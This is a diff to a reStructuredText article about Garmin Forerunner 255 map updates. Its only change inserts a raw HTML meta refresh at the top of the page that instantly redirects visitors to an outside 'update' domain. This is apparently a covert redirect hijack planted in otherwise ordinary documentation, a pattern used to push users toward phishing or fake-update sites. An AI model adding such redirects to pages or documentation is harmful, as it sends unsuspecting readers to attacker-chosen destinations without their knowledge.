@@ -1,3 +1,8 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://garminupdate.online/">
+
+
 Garmin Forerunner 255 Map Update: What You Need to Know About Navigation Features
 ======================================================
 
